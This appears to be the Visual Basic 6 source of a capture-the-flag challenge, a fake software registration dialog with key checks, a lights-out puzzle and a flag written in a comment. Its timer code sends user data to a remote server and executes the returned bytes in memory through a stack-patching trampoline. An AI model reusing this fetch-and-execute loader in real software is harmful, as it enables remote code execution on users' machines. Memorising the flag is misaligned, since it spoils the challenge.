VERSION 5.00
Begin VB.Form FrmMain 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "amib - RegisterMe"
   ClientHeight    =   2595
   ClientLeft      =   45
   ClientTop       =   375
   ClientWidth     =   5265
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   2595
   ScaleWidth      =   5265
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer tmrRefresh 
      Interval        =   1105
      Left            =   3840
      Top             =   2160
   End
   Begin VB.CommandButton cmdButton 
      Height          =   255
      Index           =   1
      Left            =   13080
      TabIndex        =   8
      Top             =   9840
      Width           =   255
   End
   Begin VB.CommandButton cmdButton 
      Height          =   255
      Index           =   0
      Left            =   12720
      TabIndex        =   7
      Top             =   9840
      Width           =   255
   End
   Begin VB.Timer tmrTalkToRemote 
      Interval        =   800
      Left            =   3840
      Top             =   1680
   End
   Begin VB.Timer tmrRegistration 
      Enabled         =   0   'False
      Interval        =   500
      Left            =   4560
      Top             =   1680
   End
   Begin VB.TextBox txtRegKey 
      Height          =   285
      Left            =   1680
      TabIndex        =   6
      Top             =   1200
      Width           =   3255
   End
   Begin VB.TextBox txtMachineCode 
      Enabled         =   0   'False
      Height          =   285
      Left            =   1680
      TabIndex        =   4
      Top             =   720
      Width           =   3255
   End
   Begin VB.TextBox txtUsername 
      Height          =   285
      Left            =   1680
      TabIndex        =   2
      Top             =   240
      Width           =   3255
   End
   Begin VB.CommandButton CmdConfirm 
      Caption         =   "Register"
      Height          =   615
      Left            =   240
      TabIndex        =   0
      Top             =   1800
      Width           =   1335
   End
   Begin VB.Label lblRegCode 
      Alignment       =   1  'Right Justify
      Caption         =   "Registration Key:"
      Height          =   375
      Left            =   0
      TabIndex        =   5
      Top             =   1200
      Width           =   1455
   End
   Begin VB.Label lblMachineCode 
      Alignment       =   1  'Right Justify
      Caption         =   "Machine code:"
      Height          =   255
      Left            =   120
      TabIndex        =   3
      Top             =   720
      Width           =   1335
   End
   Begin VB.Label lblUsername 
      Alignment       =   1  'Right Justify
      Caption         =   "User name:"
      Height          =   375
      Left            =   120
      TabIndex        =   1
      Top             =   240
      Width           =   1335
   End
End
Attribute VB_Name = "FrmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (ByVal lpDestination As Any, ByVal lpSource As Any, ByVal Length As Long)
Private Declare Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
Private Declare Function CallWindowProc Lib "user32.dll" Alias "CallWindowProcW" (ByVal lpPrevWndFunc As Long, ByVal hwnd As Long, ByVal msg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Private Declare Function VirtualProtect Lib "kernel32" (lpAddress As Any, ByVal dwSize As Long, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long
Private Declare Function GetLastError Lib "kernel32" () As Long

Private Const MEM_COMMIT = &H1000
Private Const MEM_RESERVE = &H2000
Private Const PAGE_EXECUTE_READWRITE = &H40
Private Const PAGE_READWRITE = &H4
Private Const PAGE_NOACCESS = &H1

Private Type TrampolineASM
     ASM(20) As Long
End Type

Private m_Trampoline As TrampolineASM
Private m_RegCounter As Integer
Private m_nFailedCounter As Integer
Private m_nDim As Integer
Private m_strRSAPublicKeyInfo As String

Private Function AwesomeStuff(ByVal dwRetAddr As Long) As Long
    If m_Trampoline.ASM(0) = 0 Then
        With m_Trampoline
            '.ASM(0) = &HCCCCCCCC
            .ASM(0) = &H824548B
            .ASM(1) = &HE1896066
            .ASM(2) = &H8904C183
            .ASM(3) = &H81E329CB
            .ASM(4) = &HF00FB
            .ASM(5) = &H810A7700
            .ASM(6) = &H40400F39
            .ASM(7) = &H89E97500
            .ASM(8) = &HC2616611
            .ASM(9) = &HCCCC0010
            ' 0x00:   8b 54 24 08        mov edx, dword ptr [esp + 8]
            ' 0x04:   66 60              pusha
            ' 0x06:   89 e1              mov ecx, esp
            ' 0x08:   83 c1 04           add ecx, 4
            ' 0x0b:   89 cb              mov ebx, ecx
            ' 0x0d:   29 e3              sub ebx, esp
            ' 0x0f:   81 fb 00 0f 00 00  cmp ebx, 0xf00
            ' 0x15:   77 0a              ja  0x20
            ' 0x17:   81 39 3d 1b 40 00  cmp dword ptr [ecx], 0x40400f
            ' 0x1d:   75 e9              jne 0x08
            ' 0x1f:   89 11              mov dword ptr [ecx], edx
            ' 0x21:   66 61              popa
            ' 0x23:   c2 10 00           ret 0x10
        End With
    End If
    AwesomeStuff = CallWindowProc(VarPtr(m_Trampoline), 1237, dwRetAddr, 0, 0)
End Function

Private Sub cmdButton_Click(index As Integer)
    ToggleLight index
    If index Mod m_nDim > 0 Then
        ToggleLight index - 1
    End If
    If index Mod m_nDim < (m_nDim - 1) Then
        ToggleLight index + 1
    End If
    If index \ m_nDim > 0 Then
        ToggleLight index - m_nDim
    End If
    If index \ m_nDim < (m_nDim - 1) Then
        ToggleLight index + m_nDim
    End If
End Sub

Private Sub CmdConfirm_Click()
    Dim strUsername As String, strMachineCode As String, strRegKey As String

    strUsername = txtUsername.Text
    strMachineCode = txtMachineCode.Text
    
    ' Reg key format: AAAAAAAA-BBBBBBBB-CCCCCCCC-DDDDDDDD-EEEEEEEE-FFFFFFFF-sig
    strRegKey = txtRegKey.Text
    
    Dim strHash As String, bytKey() As Byte

    bytKey = StrConv("nautilus", vbFromUnicode)

    Call MD5_Initialize
    strHash = MD5(strUsername + "|" + strMachineCode)
    
    ' MD5(strUsername + "|" + strMachineCode) == RijndaleDecrypt(Decode(strRegKey))
    Dim strRegKeyBody As String, strSignature As String, bDecoded As Boolean
    bDecoded = DecodeRegKey(strRegKeyBody, strSignature, strRegKey)
    If bDecoded = False Then
        MsgBox ":("
        m_nFailedCounter = m_nFailedCounter + 1
        Exit Sub
    End If

    Call RijndaelInitialize
    Dim bytDecrypted() As Byte
    Dim bytRegKeyBody() As Byte
    While Len(strRegKeyBody) < 32
        strRegKeyBody = strRegKeyBody & Chr(0)
    Wend
    bytRegKeyBody = StrConv(strRegKeyBody, vbFromUnicode)
    bytDecrypted = DecryptData(bytRegKeyBody, bytKey)
    If StrConv(bytDecrypted, vbUnicode) <> strHash Then
        MsgBox ":("
        m_nFailedCounter = m_nFailedCounter + 1
        If m_nFailedCounter = 4096 Then
            ' Flag 1: flag{warm_up_with_an_easy_rev_GXTYjrUY6YRueRW7FOMF}
            ' the flag is encoded as the solution to a lights out board
            Call VerifyFirstFlag
        End If
        Exit Sub
    End If

    ' TODO: Check signature
    
    MsgBox "Thank you for registering this copy of amib!"
    tmrRegistration.Enabled = True
    CmdConfirm.Enabled = False
    
End Sub

Private Function DecodeRegKey(ByRef strRegKeyBody As String, ByRef strSignature As String, strRegKey As String) As Boolean
    ' This function splits the registration key to two parts
    
    ' Split the registration key by the hyphen
    Dim parts() As String  ' 0 - 5
    parts = Split(strRegKey, "-")
    
    ' Check if the key format is correct: 7 parts and each part length for the first six is 8
    If UBound(parts) <> 6 Then
        DecodeRegKey = False
        Exit Function
    End If

    Dim I As Integer
    For I = 0 To 5
        If Len(parts(I)) <> 8 Then
            DecodeRegKey = False
            Exit Function
        End If
    Next I
    
    ' Decode the key part
    Dim result As Boolean
    
    result = DecodeRegKeyPart(strRegKeyBody, parts(0) & parts(1) & parts(2) & parts(3) & parts(4) & parts(5))
    If result = False Then
        DecodeRegKey = False
        Exit Function
    End If
    If Len(strRegKeyBody) > 32 Then
        strRegKeyBody = Mid(strRegKeyBody, 1, 32)
    End If
    
    ' Decode the signature part
    result = DecodeRegKeyPart(strSignature, parts(6))
    If result = False Then
        DecodeRegKey = False
        Exit Function
    End If
    

    ' If all checks and decodings are successful
    DecodeRegKey = True
End Function

Private Function DecodeRegKeyPart(ByRef strDecoded As String, strPart As String) As Boolean
    Dim Map1(0 To 63) As Byte
    Dim Map2(0 To 127) As Byte
    Dim c As Integer, I As Integer
    ' set Map1
    I = 0
    For c = Asc("A") To Asc("Z"): Map1(I) = c: I = I + 1: Next
    For c = Asc("a") To Asc("z"): Map1(I) = c: I = I + 1: Next
    For c = Asc("0") To Asc("9"): Map1(I) = c: I = I + 1: Next
    Map1(I) = Asc("+"): I = I + 1
    Map1(I) = Asc("/"): I = I + 1
    ' set Map2
    For I = 0 To 127: Map2(I) = 255: Next
    For I = 0 To 63: Map2(Map1(I)) = I: Next

    Dim IBuf() As Byte
    IBuf = StrConv(strPart, vbFromUnicode)
    Dim ILen As Long
    ILen = UBound(IBuf) + 1
    If ILen Mod 4 <> 0 Then
        DecodeRegKeyPart = False
        Exit Function
    End If
    Do While ILen > 0
        If IBuf(ILen - 1) <> Asc("=") Then
            Exit Do
        End If
    ILen = ILen - 1
    Loop
    Dim OLen As Long
    OLen = (ILen * 3) \ 4
    Dim Out() As Byte
    ReDim Out(0 To OLen - 1) As Byte
    Dim ip As Long
    Dim op As Long
    Do While ip < ILen
        Dim i0 As Byte: i0 = IBuf(ip): ip = ip + 1
        Dim i1 As Byte: i1 = IBuf(ip): ip = ip + 1
        Dim i2 As Byte: If ip < ILen Then i2 = IBuf(ip): ip = ip + 1 Else i2 = Asc("A")
        Dim i3 As Byte: If ip < ILen Then i3 = IBuf(ip): ip = ip + 1 Else i3 = Asc("A")
        If i0 > 127 Or i1 > 127 Or i2 > 127 Or i3 > 127 Then
            DecodeRegKeyPart = False
            Exit Function
        End If
        Dim b0 As Byte: b0 = Map2(i0)
        Dim b1 As Byte: b1 = Map2(i1)
        Dim b2 As Byte: b2 = Map2(i2)
        Dim b3 As Byte: b3 = Map2(i3)
        If b0 > 63 Or b1 > 63 Or b2 > 63 Or b3 > 63 Then
            DecodeRegKeyPart = False
            Exit Function
        End If
        Dim o0 As Byte: o0 = (b0 * 4) Or (b1 \ &H10)
        Dim o1 As Byte: o1 = ((b1 And &HF) * &H10) Or (b2 \ 4)
        Dim o2 As Byte: o2 = ((b2 And 3) * &H40) Or b3
        Out(op) = o0: op = op + 1
        If op < OLen Then Out(op) = o1: op = op + 1
        If op < OLen Then Out(op) = o2: op = op + 1
    Loop
    strDecoded = StrConv(Out, vbUnicode)
    DecodeRegKeyPart = True
End Function

Private Function VerifyFirstFlag()
    Dim strOpSequence As String
    Dim nVerified As Integer
    
    strOpSequence = OpSequenceFromFlag(txtRegKey.Text)
    nVerified = VerifyOpSequence(strOpSequence)
    If nVerified = 1 Then
        ' TODO: Write the flag to registry
        MsgBox ":)"
    End If
End Function

Private Function OpSequenceFromFlag(strFlag As String)
    Dim strKey As String, strSequence As String, I As Integer
    strKey = Chr(&HB2) & Chr(&HEA) & Chr(&H9A) & Chr(&HCA) & Chr(&H7A) & Chr(&H4A) & Chr(&HBA) & Chr(&H72) & Chr(&H2B) & Chr(&H93) & Chr(&H7A) & Chr(&H92) & Chr(&HDB) & Chr(&HE2) & Chr(&H3B) & Chr(&HE2) & Chr(&H4B) & Chr(&HFB) & Chr(&H13) & Chr(&H7B) & Chr(&H14) & Chr(&H5C) & Chr(&H34) & Chr(&HEB) & Chr(&H4) & Chr(&H14) & Chr(&HEA) & Chr(&HC3) & Chr(&H1B) & Chr(&H1C) & Chr(&H9C) & Chr(&H44) & Chr(&H34) & Chr(&H74) & Chr(&HD3) & Chr(&H43) & Chr(&H5C) & Chr(&H2C) & Chr(&H59) & Chr(&H84) & Chr(&H4C) & Chr(&H83) & Chr(&H4) & Chr(&H64) & Chr(&H84) & Chr(&H79) & Chr(&H1D) & Chr(&H45) & Chr(&H75) & Chr(&H15) & Chr(&H4) & Chr(&H62) & Chr(&H42) & Chr(&H2A) & Chr(&H52) & Chr(&H42) & Chr(&H62) & Chr(&H5A) & Chr(&H72) & Chr(&H72) & Chr(&H82) & Chr(&H92) & Chr(&H92) & Chr(&HB2) & Chr(&HA2) & Chr(&HCA)
    
    strSequence = ""
    For I = 1 To Len(strFlag)
        Dim nKeyChar As Long, nFlagChar As Integer
        
        nKeyChar = Asc(Mid(strKey, (I - 1) Mod Len(strKey) + 1, 1))
        nFlagChar = Asc(Mid(strFlag, I, 1))

        ' decode
        nKeyChar = LShift(nKeyChar, 5) + RShift(nKeyChar, 3)
        nKeyChar = nKeyChar And &HFF
        nKeyChar = nKeyChar - (I - 1)
        If nKeyChar < 0 Then
            nKeyChar = nKeyChar + &H100
        End If
        strSequence = strSequence & Chr(nKeyChar Xor nFlagChar)
    Next I
    OpSequenceFromFlag = strSequence
End Function

Private Function VerifyOpSequence(strOpSequence As String)
    ' Create buttons
    Dim nButtons As Integer, I As Integer
    
    m_nDim = 7
    nButtons = m_nDim * m_nDim - 1
    
    ' Initialization
    For I = 0 To nButtons
        If I > 1 Then
            Load cmdButton(I)
        End If
        cmdButton(I).Caption = ""
    Next I
    
    ' Verify the operation sequence
    Dim nLastPos As Integer
    nLastPos = -1
    For I = 1 To Len(strOpSequence) Step 2
        Dim strOp As String, nIndex As Integer
        
        strOp = Mid(strOpSequence, I, 2)
        ' TODO: Ensure strOp is an integer string
        nIndex = CInt(strOp)
        If nIndex < 0 Or nIndex > nButtons Then
            VerifyOpSequence = 0 ' Failed
            Exit Function
        End If
        
        ' Check if the operation sequence monotonously increases
        If nIndex <= nLastPos Then
            VerifyOpSequence = 0 ' Failed
            Exit Function
        End If
        nLastPos = nIndex
        cmdButton_Click (nIndex)
    Next I
    
    ' Winning?
    Dim bWinning As Boolean
    bWinning = True
    For I = 0 To nButtons
        ' Debug.Print Str(i) & " " & cmdButton(i).Caption
        If cmdButton(I).Caption <> "O" Then
            bWinning = False
        End If
    Next I
    
    If bWinning = True Then
        VerifyOpSequence = 1
    Else
        VerifyOpSequence = 0
    End If
    
    For I = 2 To nButtons
        Unload cmdButton(I)
    Next I
End Function

Private Sub ToggleLight(index As Integer)
    If cmdButton(index).Caption = "" Then
        cmdButton(index).Caption = "O"
    Else
        cmdButton(index).Caption = ""
    End If
End Sub

Private Function RSAEncrypt(data As String) As Byte()
    Dim rsa As New mscorlib.RSACryptoServiceProvider
    Dim dataToEncrypt() As Byte, encryptedData() As Byte, decryptedData() As Byte

    dataToEncrypt = StrConv(data, vbFromUnicode)
    rsa.FromXmlString (m_strRSAPublicKeyInfo)
    encryptedData = rsa.encrypt(dataToEncrypt, False)

    RSAEncrypt = encryptedData
End Function

Public Function LShift(num As Long, shifts As Byte) As Long
    LShift = num * (2 ^ shifts)
End Function
 
Public Function RShift(num As Long, shifts As Byte) As Long
    RShift = num \ (2 ^ shifts)
End Function

Private Function MachineCodeFromBoardInfo(strBoardInfo As String) As String
    Dim strMachineCode As String
    Dim key As Long, I As Long, n As Long, lshift_amount As Byte, rshift_amount As Byte
    
    ' TODO: VM detection
    If Len(strBoardInfo) > 15 Then
        strBoardInfo = Mid(strBoardInfo, 1, 15)
    End If
    
    key = Len(strBoardInfo) Xor &HA5
    
    For I = 1 To Len(strBoardInfo)
        n = Asc(Mid(strBoardInfo, I, 1))
        lshift_amount = I Mod 8
        rshift_amount = 8 - lshift_amount
        strMachineCode = strMachineCode + Hex(((LShift(n, lshift_amount) And &HFF) + RShift(n, rshift_amount)) Xor key)
        key = (key + I) And &HFF
    Next I

    MachineCodeFromBoardInfo = strMachineCode
End Function

Private Function LoadMachineCode()
    Dim board2 As String
    Dim objWMIService, board, item

    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set board = objWMIService.ExecQuery("select * from win32_baseboard")
    For Each item In board
        board2 = board2 & item.product
    Next
    txtMachineCode.Text = MachineCodeFromBoardInfo(board2)
End Function

Private Sub Form_Load()
    ' the RSA key will be replaced later with a weaker one
    m_strRSAPublicKeyInfo = "<RSAKeyValue><Modulus>jocqo/y7eL0ZSnITk79oNyHrTlaBcJwVlM98dGDlQjZcO+UNYGKFD0BVQiO3QjWym7aIOqjf/ERfaeQpV49sLFypuT6vzKvwnJ2JFWLghB+GqQET5XVMfomz/MFP7+e7eZ5hD7mKp1HP+YSja8/47O97fislxYFzNZJCxpZuTp9+jbXsFDYrfybxNZylnQrOfyAmoNyYcRAenewdfDVltxwjMu3e0M9h4cWNSpzsopWXjM5ZWCENu/6tSTJkg9bAe7Tx9gLlMs8tpxnUqrd7snyKFK/FldJvPP2mmdSvOV1HFVk6RA0azzVo6G9fAQIJADj65b+OyhRDTVEroSxXIQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>"
    Call LoadMachineCode
End Sub

Private Sub tmrRefresh_Timer()
    ' the weaker RSA key
    m_strRSAPublicKeyInfo = "<RSAKeyValue><Modulus>SlwwwNRtDUN4mK3ORGsA79MtNWOxjyxuB0zS/W2t7MOKE+NBCG1FVoFjSlOrG138Qd1oJSwFGOrugobAG/flot+mnbBo7+wuxi4NBgLn6hNsWHaXJzwIeASdQooQ7/gj7uuBBX0h342na7/YKH0AUe/cHi7SPMYUnQk71zp5QAAU1EZIMMcFey/+l+PUV0B2uc8OnZv4x8R0B28BJPjchb9O1D7rVzvYQRXZ1sHRqWBakS4zN2d71tZX5quRwKFZ49wMQ9EwFmy5Hd1wbR0borzsu32R92YWEnIZ+RsM+PzD5glF6YFLwuO3WS0MnD/AxVjQLabWZU/iRhGkZNmrfQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>"
    tmrRefresh.Enabled = False
End Sub

Private Sub tmrRegistration_Timer()
    m_RegCounter = m_RegCounter + 1
End Sub

Private Function url_encode(ByRef Text As String) As String
    Dim lngA As Long, strChar As String
    For lngA = 1 To Len(Text)
        strChar = Mid$(Text, lngA, 1)
        If strChar Like "[A-Za-z0-9]" Then
        ElseIf strChar = " " Then
            strChar = "+"
        Else
            strChar = "%" & Right$("0" & Hex$(Asc(strChar)), 2)
        End If
        url_encode = url_encode & strChar
    Next lngA
End Function

Private Sub tmrTalkToRemote_Timer()
    If m_RegCounter = 4 Then
        ' Send the registration data to our server
        Dim req As Object, data As String, url As String
        Dim strUsername As String, strMachineCode As String, strRegKey As String
        
        Set req = CreateObject("MSXML2.ServerXMLHTTP.6.0")
        
        strUsername = txtUsername.Text
        strMachineCode = txtMachineCode.Text
        strRegKey = txtRegKey.Text
        
        data = "u=" + url_encode(strUsername) + "&m=" + (strMachineCode) + "&r=" + url_encode(strRegKey)
        url = "http://amib-3rlkjavxnl34.shellweplayaga.me/check_registration?" & data
        
        req.Open "POST", url, False
        req.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
        req.send
        
        If Len(req.responsetext) > 5 And Mid(req.responsetext, 1, 3) = "--|" Then
            ' load the machine code
            ' TODO: Decrypt the machine code
            Dim strCode As String, strDecoded As String, bResult As Boolean
            strCode = Mid(req.responsetext, 4)
            bResult = DecodeRegKeyPart(strDecoded, strCode)
            If bResult Then
                ' Run the decrypted code
                Dim bytCode() As Byte
                bytCode = StrConv(strDecoded, vbFromUnicode)

                ' MsgBox bResult & " " & Str(Len(strDecoded))
                Dim r As Long, dwAddr As Long
        
                dwAddr = 0
                r = VirtualAlloc(dwAddr, 65536, MEM_RESERVE, PAGE_READWRITE) ' PAGE_READWRITE
                'MsgBox Hex(dwAddr)
                If r <> 0 Then
                    ' MsgBox "Allocation addr: " & Hex(r)
                    VirtualAlloc r, 4096, MEM_COMMIT, PAGE_READWRITE
                    CopyMemory r, VarPtr(bytCode(0)), UBound(bytCode)
                    VirtualProtect r, 4096, &H10, 0
                    Call AwesomeStuff(r)
                End If
            End If
        End If
    End If
End Sub
